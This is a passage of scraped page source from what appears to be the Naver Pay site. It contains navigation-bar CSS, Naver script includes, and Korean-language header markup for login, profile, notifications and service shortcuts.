			.gnb_svc_more .svc_btnwrp .gnb_save{background-position:0 -160px}
			.gnb_svc_more .svc_btnwrp .gnb_close{margin-left:1px;background-position:-65px -160px}
			.gnb_svc_more .svc_btnwrp .gnb_return{position:absolute;top:5px;left:15px;background-position:-130px -160px}
			.gnb_type2 .gnb_notice_li a.gnb_notice .gnb_icon{background-position:-155px -120px}
			.gnb_type2 .gnb_notice_li a.gnb_notice:hover .gnb_icon{background-position:-155px -140px}
			.gnb_type2 .gnb_service_li .gnb_service .gnb_icon{background-position:-200px -120px}
			.gnb_type2 .gnb_service_li .gnb_service:hover .gnb_icon{background-position:-200px -140px}
			.gnb_type2 .mail_li a.gnb_mail .gnb_icon{background-position:-175px -120px}
			.gnb_type2 .mail_li a.gnb_mail:hover .gnb_icon{background-position:-175px -140px}
			.gnb_dark .gnb_my_li .gnb_my .gnb_name, .gnb_dark .gnb_login_li .gnb_btn_login .gnb_txt{color:#fff}
			.gnb_dark .gnb_notice_li a.gnb_notice .gnb_icon{background-position:-220px -140px}
			.gnb_dark .gnb_notice_li a.gnb_notice:hover .gnb_icon{background-position:-220px -120px}
			.gnb_dark .mail_li a.gnb_mail .gnb_icon{background-position:-238px -141px}
			.gnb_dark .mail_li a.gnb_mail:hover .gnb_icon{background-position:-238px -121px}
			.gnb_dark .gnb_service_li .gnb_service .gnb_icon{background-position:-261px -140px}
			.gnb_dark .gnb_service_li .gnb_service:hover .gnb_icon{background-position:-261px -120px}
			.gnb_dark_type2 .gnb_my_li .gnb_my .gnb_name, .gnb_dark_type2 .gnb_login_li .gnb_btn_login .gnb_txt{color:#fff}
			.gnb_dark_type2 .gnb_notice_li a.gnb_notice .gnb_icon{background-position:-220px -120px}
			.gnb_dark_type2 .gnb_notice_li a.gnb_notice:hover .gnb_icon{background-position:-220px -140px}
			.gnb_dark_type2 .mail_li a.gnb_mail .gnb_icon{background-position:-238px -121px}
			.gnb_dark_type2 .mail_li a.gnb_mail:hover .gnb_icon{background-position:-238px -141px}
			.gnb_dark_type2 .gnb_service_li .gnb_service .gnb_icon{background-position:-261px -120px}
			.gnb_dark_type2 .gnb_service_li .gnb_service:hover .gnb_icon{background-position:-261px -140px;}
			.gnb_dark .gnb_notice_li a.gnb_notice, .gnb_dark_type2 .gnb_notice_li a.gnb_notice {width: 17px;height: 19px;padding: 6px 8px 3px;}
			.gnb_dark .gnb_notice_li a.gnb_notice .gnb_icon, .gnb_dark_type2 .gnb_notice_li a.gnb_notice .gnb_icon {width: 17px;height: 19px;}
			.gnb_dark .mail_li a.gnb_mail, .gnb_dark_type2 .mail_li a.gnb_mail {width: 22px;height: 16px;padding: 7px 8px 4px;}
			.gnb_dark .mail_li a.gnb_mail .gnb_icon, .gnb_dark_type2 .mail_li a.gnb_mail .gnb_icon {width: 22px;height: 16px;}
			.gnb_dark .gnb_service_li a.gnb_service, .gnb_dark_type2 .gnb_service_li a.gnb_service {width: 18px;height: 18px;padding: 6px 8px 4px;}
			.gnb_dark .gnb_service_li .gnb_service .gnb_icon, .gnb_dark_type2 .gnb_service_li .gnb_service .gnb_icon {width: 18px;height: 18px;}
			#gnb.gnb_one .gnb_my_li .gnb_my .gnb_name, #gnb.gnb_one_small .gnb_my_li .gnb_my .gnb_name, #gnb.gnb_one .gnb_login_li .gnb_btn_login .gnb_txt, #gnb.gnb_one_small .gnb_login_li .gnb_btn_login .gnb_txt{color:#fff}
			#gnb.gnb_one .gnb_login_li, #gnb.gnb_one_small .gnb_login_li {height: 28px;}
			#gnb.gnb_one .gnb_login_li .gnb_btn_login, #gnb.gnb_one_small .gnb_login_li .gnb_btn_login, #gnb.gnb_one .gnb_login_li .gnb_bg, #gnb.gnb_one_small .gnb_login_li .gnb_bg, #gnb.gnb_one .gnb_login_li .gnb_bdr, #gnb.gnb_one_small .gnb_login_li .gnb_bdr, #gnb.gnb_one .gnb_login_li .gnb_txt, #gnb.gnb_one_small .gnb_login_li .gnb_txt {width: 53px;height: 23px;}
			#gnb.gnb_one .gnb_login_li .gnb_btn_login .gnb_txt, #gnb.gnb_one_small .gnb_login_li .gnb_btn_login .gnb_txt {top: -1px;width: 53px;height: 23px;line-height: 28px;font-size: 11px;}
			#gnb.gnb_one .gnb_login_li, #gnb.gnb_one_small .gnb_login_li, #gnb.gnb_one .gnb_my_li, #gnb.gnb_one_small .gnb_my_li, #gnb.gnb_one .gnb_notice_li, #gnb.gnb_one_small .gnb_notice_li, #gnb.gnb_one .mail_li, #gnb.gnb_one_small .mail_li, #gnb.gnb_one .gnb_service_li, #gnb.gnb_one_small .gnb_service_li{margin-right: 0;margin-left: 0; background: url(http://ssl.pstatic.net/static/common/gnb/bg_one_line.png) repeat-y right 0;}
			#gnb.gnb_one .gnb_login_li a, #gnb.gnb_one_small .gnb_login_li a, #gnb.gnb_one .gnb_my_li a, #gnb.gnb_one_small .gnb_my_li a, #gnb.gnb_one .gnb_notice_li a, #gnb.gnb_one_small .gnb_notice_li a, #gnb.gnb_one .mail_li a, #gnb.gnb_one_small .mail_li a, #gnb.gnb_one .gnb_service_li a, #gnb.gnb_one_small .gnb_service_li a {margin-right: 1px;}
			#gnb.gnb_one .gnb_login_li.hover .gnb_service, #gnb.gnb_one_small .gnb_login_li.hover .gnb_service, #gnb.gnb_one .gnb_login_li.hover .gnb_notice, #gnb.gnb_one_small .gnb_login_li.hover .gnb_notice, #gnb.gnb_one .gnb_login_li.hover .gnb_mail, #gnb.gnb_one_small .gnb_login_li.hover .gnb_mail, #gnb.gnb_one .gnb_login_li.hover .gnb_service, #gnb.gnb_one_small .gnb_login_li.hover .gnb_service, #gnb.gnb_one .gnb_my_li.hover .gnb_service, #gnb.gnb_one_small .gnb_my_li.hover .gnb_service, #gnb.gnb_one .gnb_my_li.hover .gnb_notice, #gnb.gnb_one_small .gnb_my_li.hover .gnb_notice, #gnb.gnb_one .gnb_my_li.hover .gnb_mail, #gnb.gnb_one_small .gnb_my_li.hover .gnb_mail, #gnb.gnb_one .gnb_my_li.hover .gnb_service, #gnb.gnb_one_small .gnb_my_li.hover .gnb_service, #gnb.gnb_one .gnb_notice_li.hover .gnb_service, #gnb.gnb_one_small .gnb_notice_li.hover .gnb_service, #gnb.gnb_one .gnb_notice_li.hover .gnb_notice, #gnb.gnb_one_small .gnb_notice_li.hover .gnb_notice, #gnb.gnb_one .gnb_notice_li.hover .gnb_mail, #gnb.gnb_one_small .gnb_notice_li.hover .gnb_mail, #gnb.gnb_one .gnb_notice_li.hover .gnb_service, #gnb.gnb_one_small .gnb_notice_li.hover .gnb_service, #gnb.gnb_one .mail_li.hover .gnb_service, #gnb.gnb_one_small .mail_li.hover .gnb_service, #gnb.gnb_one .mail_li.hover .gnb_notice, #gnb.gnb_one_small .mail_li.hover .gnb_notice, #gnb.gnb_one .mail_li.hover .gnb_mail, #gnb.gnb_one_small .mail_li.hover .gnb_mail, #gnb.gnb_one .mail_li.hover .gnb_service, #gnb.gnb_one_small .mail_li.hover .gnb_service, #gnb.gnb_one .gnb_service_li.hover .gnb_service, #gnb.gnb_one_small .gnb_service_li.hover .gnb_service, #gnb.gnb_one .gnb_service_li.hover .gnb_notice, #gnb.gnb_one_small .gnb_service_li.hover .gnb_notice, #gnb.gnb_one .gnb_service_li.hover .gnb_mail, #gnb.gnb_one_small .gnb_service_li.hover .gnb_mail, #gnb.gnb_one .gnb_service_li.hover .gnb_service, #gnb.gnb_one_small .gnb_service_li.hover .gnb_service {background: url(http://ssl.pstatic.net/static/common/gnb/bg_one_hover.png) repeat 0 0;}
			#gnb.gnb_one .gnb_my_li .gnb_my .gnb_name, #gnb.gnb_one_small .gnb_my_li .gnb_my .gnb_name{margin:0 0 0 1px;}
			#gnb.gnb_one .gnb_notice_li a.gnb_notice, #gnb.gnb_one_small .gnb_notice_li a.gnb_notice{width:17px;height:19px}
			#gnb.gnb_one .gnb_notice_li a.gnb_notice .gnb_icon, #gnb.gnb_one_small .gnb_notice_li a.gnb_notice .gnb_icon{width:17px;height:19px;background-position:-284px -119px}
			#gnb.gnb_one .gnb_notice_li a.gnb_notice:hover .gnb_icon, #gnb.gnb_one_small .gnb_notice_li a.gnb_notice:hover .gnb_icon{background-position:-284px -119px}
			#gnb.gnb_one .mail_li a.gnb_mail, #gnb.gnb_one_small .mail_li a.gnb_mail{width:21px;height:17px}
			#gnb.gnb_one .mail_li a.gnb_mail .gnb_icon, #gnb.gnb_one_small .mail_li a.gnb_mail .gnb_icon{width:21px;height:17px;background-position:-302px -120px}
			#gnb.gnb_one .mail_li a.gnb_mail:hover .gnb_icon, #gnb.gnb_one_small .mail_li a.gnb_mail:hover .gnb_icon{background-position:-302px -120px}
			#gnb.gnb_one .gnb_service_li .gnb_service, #gnb.gnb_one_small .gnb_service_li .gnb_service{width:17px;height:17px}
			#gnb.gnb_one .gnb_service_li .gnb_service .gnb_icon, #gnb.gnb_one_small .gnb_service_li .gnb_service .gnb_icon{width:17px;height:17px;background-position:-324px -120px}
			#gnb.gnb_one .gnb_service_li .gnb_service:hover .gnb_icon, #gnb.gnb_one_small .gnb_service_li .gnb_service:hover .gnb_icon{background-position:-324px -120px}
			#gnb.gnb_one .gnb_my_lyr, #gnb.gnb_one_small .gnb_my_lyr, #gnb.gnb_one .gnb_notice_lyr, #gnb.gnb_one_small .gnb_notice_lyr, #gnb.gnb_one .gnb_service_lyr, #gnb.gnb_one_small .gnb_service_lyr {right: 7px;}
			#gnb.gnb_one .gnb_ico_num, #gnb.gnb_one_small .gnb_ico_num{width:34px;top:10px;right:3px;left:auto;vertical-align:top}
			#gnb.gnb_one .gnb_ico_num .gnb_ico_new, #gnb.gnb_one_small .gnb_ico_num .gnb_ico_new{vertical-align:top;height:13px;background-position:-332px -60px;}
			#gnb.gnb_one .gnb_ico_num .gnb_count, #gnb.gnb_one_small .gnb_ico_num .gnb_count {height: 13px;padding: 0 6px 0 2px;background-position: 100% -60px;font-size: 10px;font-weight: normal;}
			#gnb.gnb_one .gnb_ico_num .plus, #gnb.gnb_one_small .gnb_ico_num .plus{margin:1px 0 0 2px}
			#gnb.gnb_one .ico_arrow{top:48px}
			#gnb.gnb_one .gnb_my_lyr, #gnb.gnb_one .gnb_notice_lyr{top:47px}
			#gnb.gnb_one .gnb_service_lyr{top:48px;}
			#gnb.gnb_one .gnb_login_li{padding:16px 21px 10px 1px;}
			#gnb.gnb_one .gnb_my_li{padding:12px 20px 12px 2px}
			#gnb.gnb_one .gnb_my_li .ico_arrow{top:34px}
			#gnb.gnb_one .gnb_notice_li a.gnb_notice{padding:18px 19px 17px 19px}
			#gnb.gnb_one .mail_li a.gnb_mail{padding:19px 17px 18px 17px}
			#gnb.gnb_one .gnb_service_li .gnb_service{padding:19px 19px 18px 19px}
			#gnb.gnb_one_small .ico_arrow{top:33px}
			#gnb.gnb_one_small .gnb_my_lyr, #gnb.gnb_one_small .gnb_notice_lyr{top:32px}
			#gnb.gnb_one_small .gnb_service_lyr{top:33px}
			#gnb.gnb_one_small .gnb_login_li{padding:7px 12px 4px 2px}
			#gnb.gnb_one_small .gnb_my_li{padding:5px 20px 4px 2px}
			#gnb.gnb_one_small .gnb_my_li .ico_arrow{top:27px}
			#gnb.gnb_one_small .gnb_notice_li a.gnb_notice{padding:10px 11px 10px 12px}
			#gnb.gnb_one_small .mail_li a.gnb_mail{padding:11px 10px 11px 9px}
			#gnb.gnb_one_small .gnb_service_li .gnb_service{padding:11px 12px 11px 11px}
			#gnb.gnb_one_small .gnb_ico_num{top:5px;right:6px;width:24px}
			#gnb.gnb_one_flat .gnb_login_li,
			#gnb.gnb_one_flat .gnb_my_li,
			#gnb.gnb_one_flat .gnb_notice_li,
			#gnb.gnb_one_flat .mail_li,
			#gnb.gnb_one_flat .gnb_service_li {border-color: #e0e0e0;}
			#gnb.gnb_one_flat .gnb_notice_li.hover,
			#gnb.gnb_one_flat .mail_li.hover,
			#gnb.gnb_one_flat .gnb_service_li.hover {background-color: rgba(0, 0, 0, 0.04);}
			#gnb.gnb_one_flat .gnb_service_li .gnb_service .gnb_icon,
			#gnb.gnb_one_flat .gnb_service_li .gnb_service:hover .gnb_icon {background-image: url(http://ssl.pstatic.net/static/common/gnb/one/sp_gnb_4b16e6.png);background-position: -84px -24px;background-repeat: no-repeat; width: 16px;height: 16px;vertical-align: top; margin: 0 1px;}
			#gnb.gnb_one_flat .mail_li a.gnb_mail .gnb_icon,
			#gnb.gnb_one_flat .mail_li a.gnb_mail:hover .gnb_icon {background-image: url(http://ssl.pstatic.net/static/common/gnb/one/sp_gnb_4b16e6.png);background-position: 0px -42px;background-repeat: no-repeat;width: 20px;height: 16px;vertical-align: top;margin: 0 1px;}
			#gnb.gnb_one_flat .gnb_notice_li a.gnb_notice .gnb_icon,
			#gnb.gnb_one_flat .gnb_notice_li a.gnb_notice:hover .gnb_icon {background-image: url(http://ssl.pstatic.net/static/common/gnb/one/sp_gnb_4b16e6.png);background-position: -84px 0px;background-repeat: no-repeat;width: 16px;height: 18px;vertical-align: top;margin: 0 1px;}
			#gnb.gnb_one_flat .gnb_my_li .gnb_my .gnb_name,
			#gnb.gnb_one_flat .gnb_login_li .gnb_btn_login .gnb_txt {color: #666;}</style><script src="http://ssl.pstatic.net/static.gn/js/clickcrD.js" id="gnb_clickcrD" charset="utf-8"></script><script src="https://static.nid.naver.com/getLoginStatus?callback=showGNB&amp;charset=utf-8&amp;svc=checkout&amp;template=gnb_utf8&amp;one_naver=0" id="gnb_user_data" charset="utf-8"></script><script src="https://static.nid.naver.com/getLoginStatus?callback=showGNB&amp;charset=utf-8&amp;svc=checkout&amp;template=gnb_utf8&amp;one_naver=0" id="gnb_user_data" charset="utf-8"></script><script src="https://static.nid.naver.com/getLoginStatus?callback=showGNB&amp;charset=utf-8&amp;svc=checkout&amp;template=gnb_utf8&amp;one_naver=0" id="gnb_user_data" charset="utf-8"></script><script src="https://static.nid.naver.com/getLoginStatus?callback=showGNB&amp;charset=utf-8&amp;svc=checkout&amp;template=gnb_utf8&amp;one_naver=0" id="gnb_user_data" charset="utf-8"></script></head>
			<body class="w_bg1">
				<div id="wrap">
			
				<!-- u_skip -->
				
				<!-- //u_skip -->
			
				<!-- header -->
				<div id="header">
					<div class="hd_inner">
					<script type="text/javascript">
						var nsc="checkout.all";
						var gnb_service="checkout";
						var gnb_template="gnb_utf8";
						var gnb_logout=encodeURIComponent("http://pay.naver.com/about");
						var gnb_brightness=2;
						var gnb_item_hide_option=0;
					</script>
					<div class="gnb_sc">
						<div class="site">
							<dl>
							<dt class="blind">패밀리사이트</dt>
							<dd>
								<a href="http://www.naver.com/" class="s_link1"><span>NAVER</span></a><!--N=a:GNB.naver-->
								<a href="http://shopping.naver.com" class="s_link2"><span>네이버쇼핑</span></a><!--N=a:GNB.shopping-->
							</dd>
							</dl>
						</div>
						<div class="chkout_gnb_wrap">
							<dl class="link">
							<dt class="blind">네이버페이링크</dt>
							<dd>
								<a href="http://shopping.naver.com/cart">
									<span class="icon_cart"></span>장바구니
								</a><!--N=a:GNB.cart-->
							</dd>
							</dl>
							<!-- GNB -->
							<div id="gnb" class="gnb_dark"><strong class="blind">사용자 링크</strong><ul class="gnb_lst" id="gnb_lst" style="display:none"><li class="gnb_login_li" id="gnb_login_layer"><a class="gnb_btn_login" href="#" id="gnb_login_button"><span class="gnb_bg"></span><span class="gnb_bdr"></span><span class="gnb_txt">로그인</span></a></li><li class="gnb_my_li" id="gnb_my_layer" style="display:none"><div class="gnb_my_namebox" id="gnb_my_namebox"><a href="javascript:;" class="gnb_my" onclick="gnbUserLayer.clickToggle(); return false;"><img id="gnb_profile_img" src="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs%3D" onerror="this.src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFAAAABQCAMAAAC5zwKfAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAADNQTFRF8PDw5ubm+vr6+/v76enp+Pj47e3t5+fn9/f37Ozs9PT08vLy7+/v6urq9fX15OTk/f39pqwodgAAAQNJREFUeNrs11EOgyAMgOEWUAF19f6n3cMeplJHoSZbsv4H+DIWaCNsNwcGGmiggQZ+D/Q5reuasr8H9ID0CsHfALpA74JTgwPSPnRK0Ac6FrwOXOjcogIdlTkNuDDgogGRAVEBDsQ19IMzC879ILAgGNgAZhbMP3RttonxJs1Lgea/sDYcyreHXjW+oPUHVid2MWC1K+A0sqsDW7CksGmlCNZoFt9pIfjYgY8bwMMexUENQuOtqYCxfHtT7AddYodDcp0gIPEh9IBxous+nBuaTis4Nw/OSLVwloN+JEmjGJR5FyIDRpIWZeAoBkcZGMRgkIEkz0D7GjXQQAMN/GvwKcAAEGGHJh0mmaAAAAAASUVORK5CYII='" width="26" height="26" alt="내 프로필 이미지"><span id="gnb_profile_filter_mask" class="filter_mask"></span> <span class="gnb_name" id="gnb_name1"></span><em class="blind">내정보 보기</em><span class="ico_arrow"></span></a><a href="#" class="gnb_emp" id="gnb_emp">(임직원혜택)</a></div><div class="gnb_my_lyr" id="gnb_my_lyr"><div class="gnb_my_content"><div class="gnb_img_area"><span class="gnb_mask"></span><img src="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs%3D" onerror="this.src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFAAAABQCAMAAAC5zwKfAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAADNQTFRF8PDw5ubm+vr6+/v76enp+Pj47e3t5+fn9/f37Ozs9PT08vLy7+/v6urq9fX15OTk/f39pqwodgAAAQNJREFUeNrs11EOgyAMgOEWUAF19f6n3cMeplJHoSZbsv4H+DIWaCNsNwcGGmiggQZ+D/Q5reuasr8H9ID0CsHfALpA74JTgwPSPnRK0Ac6FrwOXOjcogIdlTkNuDDgogGRAVEBDsQ19IMzC879ILAgGNgAZhbMP3RttonxJs1Lgea/sDYcyreHXjW+oPUHVid2MWC1K+A0sqsDW7CksGmlCNZoFt9pIfjYgY8bwMMexUENQuOtqYCxfHtT7AddYodDcp0gIPEh9IBxous+nBuaTis4Nw/OSLVwloN+JEmjGJR5FyIDRpIWZeAoBkcZGMRgkIEkz0D7GjXQQAMN/GvwKcAAEGGHJh0mmaAAAAAASUVORK5CYII='" width="80" height="80" alt="프로필 이미지"><a href="https://nid.naver.com/user2/api/naverProfile?m=checkIdType" class="gnb_change"><span class="blind">프로필 사진 변경</span></a></div><div class="gnb_txt_area"><p class="gnb_account"><span class="gnb_name" id="gnb_name2"><a class="gnb_nick" href="https://nid.naver.com/user2/api/naverProfile?m=checkIdType">_</a>님</span><a class="gnb_btn_login" href="#" id="gnb_logout_button"><span class="gnb_bg"></span><span class="gnb_bdr"></span><span class="gnb_txt">로그아웃</span></a></p><a href="https://mail.naver.com" class="gnb_mail_address">@naver.com</a><ul class="gnb_edit_lst"><li class="gnb_info"><a href="https://nid.naver.com/user2/help/myInfo?menu=home">내정보</a></li><li class="gnb_secure" id="gnb_secure_lnk"><a href="https://nid.naver.com/user2/help/myInfo?m=viewSecurity&amp;menu=security">보안설정</a></li><li class="gnb_cert" id="gnb_cert_lnk"><a href="https://nid.naver.com/user2/eSign/v1/home/land">내인증서</a></li></ul><div class="gnb_pay_check" id="gnb_pay_check"><p class="gnb_membership" style="display: none;" id="gnb_membership"><a href="https://nid.naver.com/membership/my" class="gnb_my_membership"><i class="blind">네이버 멤버쉽</i></a></p><em>N Pay</em><a href="https://pay.naver.com" id="gnb_pay_point"><span style="display: none">내 페이포인트</span></a></div></div></div><div class="gnb_my_community"><a href="https://blog.naver.com/MyBlog.naver" class="gnb_blog">내 블로그</a><a href="https://section.cafe.naver.com" class="gnb_cafe">가입한 카페</a><a href="https://pay.naver.com" class="gnb_pay"><span>N Pay</span></a></div><a href="#" class="gnb_my_interface" style="display:none"><span class="blind">환경설정</span></a></div><iframe id="gnb_my_lyr_iframe" title="빈 프레임" class="gnb_pad_lyr" name="padding" width="0" height="0" scrolling="no" frameborder="0" style="top:34px;right:-4px;width:320px;height:158px;display:none;opacity:0;-ms-filter:alpha(opacity=0)"></iframe></li><li class="gnb_notice_li" id="gnb_notice_layer" style="display:none"><a href="javascript:;" class="gnb_notice" onclick="gnbNaverMeLayer.clickToggle(); return false;"><span class="blind">알림</span><span class="gnb_icon"></span><em class="gnb_ico_num" id="gnb_me_menu" style="display:none"><span class="gnb_ico_new"><span class="gnb_count" id="gnb_me_count"></span></span></em><span class="ico_arrow"></span></a><div class="gnb_notice_lyr" id="gnb_notice_lyr"><div class="svc_noti svc_panel"><div class="svc_scroll"><div class="svc_head"><strong class="gnb_tit">전체 알림</strong><div class="task_right"><button onclick="gnbNaverMeLayer.deleteReadList(this, event);" id="gnb_btn_read_noti_del">읽은 알림 삭제</button><button onclick="gnbNaverMeLayer.showDeleteAlert();" id="gnb_btn_all_noti_del">모두 삭제</button></div></div><div class="svc_body" id="gnb_naverme_layer"></div></div><div class="gnb_ly_alert" id="gnb_ly_alert" style="display: none;"><p class="gnb_msg"><strong>알림을 모두 삭제하시겠습니까?</strong></p><div class="gnb_btns"><button id="ly_alert_confirm" onclick="gnbNaverMeLayer.deleteAllList(this, event);">확인</button><button onclick="gnbNaverMeLayer.hideDeleteAlert();">취소</button></div><button class="gnb_btn_close" onclick="gnbNaverMeLayer.hideDeleteAlert();"><i>레이어 닫기</i></button></div><a href="https://noti.naver.com/index.nhn" class="gnb_notice_all">내 알림 전체보기</a></div></div><iframe id="gnb_notice_lyr_iframe" title="빈 프레임" class="gnb_pad_lyr" name="padding" width="0" height="0" scrolling="no" frameborder="0" style="top:34px;right:-4px;width:299px;height:332px;display:none;opacity:0;-ms-filter:alpha(opacity=0)"></iframe></li><li class="mail_li" id="gnb_mail_layer" style="display:none"><a href="https://mail.naver.com" class="gnb_mail"><span class="blind">메일</span><span class="gnb_icon"></span><em class="gnb_ico_num" id="gnb_mail_menu" style="display:none"><span class="gnb_ico_new"><span class="gnb_count" id="gnb_mail_count"></span></span></em></a></li><li class="gnb_service_li" id="gnb_service_layer"><a href="javascript:;" class="gnb_service" onclick="gnbMoreLayer.clickToggle(); return false;"><span class="blind">서비스 더보기</span><span class="gnb_icon"></span><span class="ico_arrow"></span></a><div class="gnb_service_lyr" id="gnb_service_lyr"><div class="gnb_favorite_search" id="gnb_favorite_search"><div class="gnb_favorite_area"><div class="gnb_favorite_lstwrp"><div class="gnb_first_visit" style="display:none"><span class="blind">나만의 즐겨찾기를 추가해 보세요!</span><a href="#" class="gnb_close"><span class="blind">닫기</span></a></div><strong class="blind">즐겨찾는 서비스</strong><ul class="gnb_favorite_lst" id="gnb_favorite_lst"><li class="gnb_add"><a href="#"><span class="ic_add"></span>추가</a></li><li class="gnb_add"><a href="#"><span class="ic_add"></span>추가</a></li><li class="gnb_add"><a href="#"><span class="ic_add"></span>추가</a></li><li class="gnb_add"><a href="#"><span class="ic_add"></span>추가</a></li></ul><a href="#" class="gnb_my_interface" onclick="gnbMoreLayer.clickToggleWhole(); return false;"><span class="blind">즐겨찾기 설정</span></a></div></div><div class="gnb_search_area"><div class="gnb_search_box" onmouseover="gnb_search.mouseOver(this);" onmouseout="gnb_search.mouseOut(this);"><input id="gnb_svc_search_input" type="text" title="서비스 검색" value="더 많은 서비스를 간편하게 시작하세요!" onfocus="gnb_search.clearInput(this);" onblur="gnb_search.resetInput(this);" onkeydown="gnb_search.keyDown(event);" onkeyup="gnb_search.keyUp(event);"><a href="#" class="gnb_del_txt" id="gnb_del_txt" style="display:none"><span class="blind">삭제</span></a><div class="gnb_pop_input" id="gnb_pop_input" tabindex="0" onfocus="gnb_search.searchPopOnMouse = true; return false;" onfocusout="gnb_search.searchPopOnMouse = false; return false;" onmouseover="gnb_search.searchPopOnMouse = true; return false;" onmouseout="gnb_search.searchPopOnMouse = false; return false;" style="display:none"><ul class="gnb_pop_lst"></ul></div></div><div id="gnb_search_lstwrp" class="gnb_search_lstwrp"><ul class="gnb_search_lst gnb_first"><li class="gnb_first"><a id="gnb_search_lst_first_item" href="https://cafe.naver.com/">카페</a></li><li><a href="https://news.naver.com/">뉴스</a></li><li><a href="https://map.naver.com/">지도</a></li><li><a href="https://sports.news.naver.com/">스포츠</a></li><li><a href="https://game.naver.com/">게임</a></li></ul><ul class="gnb_search_lst"><li class="gnb_first"><a href="https://section.blog.naver.com/">블로그</a></li><li><a href="https://post.naver.com/main.nhn">포스트</a></li><li><a href="https://dict.naver.com/">사전</a></li><li><a href="https://kin.naver.com/">지식iN</a></li><li><a href="https://n.weather.naver.com/">날씨</a></li></ul><ul class="gnb_search_lst"><li class="gnb_first"><a href="https://mail.naver.com/">메일</a></li><li><a href="https://stock.naver.com/">증권</a></li><li><a href="https://land.naver.com/">부동산</a></li><li><a href="https://vibe.naver.com/today/">VIBE</a></li><li><a href="https://book.naver.com">책</a></li></ul><ul class="gnb_search_lst"><li class="gnb_first"><a href="https://shopping.naver.com/">쇼핑</a></li><li><a href="https://comic.naver.com/">웹툰</a></li><li><a href="https://movie.naver.com/">영화</a></li><li><a href="https://mybox.naver.com/">MYBOX</a></li><li><a href="https://auto.naver.com/">자동차</a></li></ul></div></div><div class="gnb_banner"><a href="https://campaign.naver.com/npay/rediret/index.nhn" class="gnb_service_event"><img id="gnb_promo" alt="N페이, 이벤트 참여하면 포인트 적립!" width="265" height="47" src="https://ssl.pstatic.net/static/common/gnb/banner/promo_npay_200108.png"></a></div><div class="gnb_linkwrp"><a href="https://www.naver.com/more.html" class="gnb_service_all" id="gnb_service_all">전체 서비스 보기</a></div></div><div class="gnb_svc_more" id="gnb_svc_more" style=""><strong class="blind">네이버 주요 서비스</strong><div class="gnb_bg_top"></div><div class="gnb_svc_hd" id="gnb_svc_hd" tabindex="0"><strong class="gnb_svc_tit">바로가기 설정</strong><span class="link"><a href="https://www.naver.com/more.html">전체 서비스 보기</a></span></div><div class="gnb_svc_lstwrp"><div class="gnb_svc_lst1"><ul class="gnb_first"><li><input type="checkbox" id="nsvc_game" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_game">게임</label></li><li><input type="checkbox" id="nsvc_weather" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_weather">날씨</label></li><li><input type="checkbox" id="nsvc_shopping" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_shopping">네이버쇼핑</label></li><li><input type="checkbox" id="nsvc_navercast" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_navercast">네이버캐스트</label></li><li class="gnb_event"><input type="checkbox" id="nsvc_naverpay" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_naverpay">네이버페이<em class="ic_gnb_new">New</em></label></li><li><input type="checkbox" id="nsvc_mybox" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_mybox">네이버 MYBOX</label></li><li><input type="checkbox" id="nsvc_news" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_news">뉴스</label></li><li><input type="checkbox" id="nsvc_comic" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_comic">웹툰</label></li><li><input type="checkbox" id="nsvc_memo" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_memo">메모</label></li><li><input type="checkbox" id="nsvc_mail" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_mail">메일</label></li><li><input type="checkbox" id="nsvc_music" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_music">뮤직</label></li><li><input type="checkbox" id="nsvc_land" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_land">부동산</label></li><li><input type="checkbox" id="nsvc_bookmark" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_bookmark">북마크</label></li></ul><ul class=""><li><input type="checkbox" id="nsvc_blog" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_blog">블로그</label></li><li><input type="checkbox" id="nsvc_dic" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_dic">사전</label></li><li><input type="checkbox" id="nsvc_software" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_software">소프트웨어</label></li><li><input type="checkbox" id="nsvc_smartboard" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_smartboard">스마트보드</label></li><li><input type="checkbox" id="nsvc_sports" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_sports">스포츠</label></li><li><input type="checkbox" id="nsvc_series" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_series">시리즈</label></li><li><input type="checkbox" id="nsvc_serieson" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_serieson">시리즈on</label></li><li><input type="checkbox" id="nsvc_ya9" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_ya9">야구9단</label></li><li><input type="checkbox" id="nsvc_movie" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_movie">영화</label></li><li><input type="checkbox" id="nsvc_office" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_office">오피스</label></li><li><input type="checkbox" id="nsvc_novel" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_novel">웹소설</label></li><li><input type="checkbox" id="nsvc_auto" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_auto">자동차</label></li><li><input type="checkbox" id="nsvc_contact" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_contact">주소록</label></li></ul><ul class=""><li><input type="checkbox" id="nsvc_finance" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_finance">증권(금융)</label></li><li><input type="checkbox" id="nsvc_map" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_map">지도</label></li><li><input type="checkbox" id="nsvc_kin" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_kin">지식iN</label></li><li><input type="checkbox" id="nsvc_terms" name="selmenu" 